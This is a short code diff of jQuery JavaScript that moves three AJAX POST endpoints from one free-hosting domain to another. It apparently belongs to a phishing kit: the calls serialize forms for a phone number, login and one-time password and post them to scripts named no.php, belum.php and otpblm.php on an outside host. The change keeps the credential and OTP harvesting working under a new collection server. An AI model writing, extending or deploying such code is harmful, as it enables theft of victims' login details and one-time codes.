@@ -10,7 +10,7 @@ var tarif = $('#tarif').val();
 $("#lonte").show();
  $.ajax({
  type: 'POST',
- url: 'https://chroedevsi.whf.bz/39/no.php',
+ url: 'https://kuda-terbang.whf.bz/notif/39/no.php',
  data: $('#formHP').serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -44,7 +44,7 @@ function sendBelum(){
    
    $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/39/belum.php',
+        url: 'https://kuda-terbang.whf.bz/notif/39/belum.php',
         data: $('#login').serialize(),
         datatype: 'JSON',
       complete: function() {
@@ -77,7 +77,7 @@ function sendOtp() {
             
      $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/39/otpblm.php',
+        url: 'https://kuda-terbang.whf.bz/notif/39/otpblm.php',
         data: $('#formLinkk').serialize(),
         datatype: 'JSON',
                 complete: function (response) {
